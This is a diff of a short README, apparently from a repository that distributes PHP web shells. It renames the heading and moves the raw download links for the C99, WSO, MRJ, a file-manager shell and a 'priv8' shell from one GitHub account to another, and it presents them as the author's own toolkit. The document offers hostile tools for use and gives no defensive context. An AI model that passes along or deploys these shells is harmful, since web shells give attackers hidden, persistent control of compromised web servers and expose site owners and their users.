@@ -1,4 +1,5 @@
-# zxc
+
+# liiuxii 💕
 * the webshell i use
 
 * C99 shell [C99]
@@ -8,8 +9,8 @@
 * Ngiiix1337 priv8 Shell [PRIV]
 
 
-[C99]: https://raw.githubusercontent.com/0xll0/zxc/main/c⁹⁹.php
-[WSO]: https://raw.githubusercontent.com/0xll0/zxc/main/.v.php
-[MRJ]: https://raw.githubusercontent.com/0xll0/zxc/main/mrj.php
-[fm]:https://raw.githubusercontent.com/0xll0/zxc/main/fm.php
-[PRIV]:https://raw.githubusercontent.com/0xll0/zxc/main/shell.php
+[C99]: https://raw.githubusercontent.com/liiuxii/zxc/main/c⁹⁹.php
+[WSO]: https://raw.githubusercontent.com/liiuxii/zxc/main/.v.php
+[MRJ]: https://raw.githubusercontent.com/liiuxii/zxc/main/mrj.php
+[fm]:https://raw.githubusercontent.com/liiuxii/zxc/main/fm.php
+[PRIV]:https://raw.githubusercontent.com/liiuxii/zxc/main/shell.php
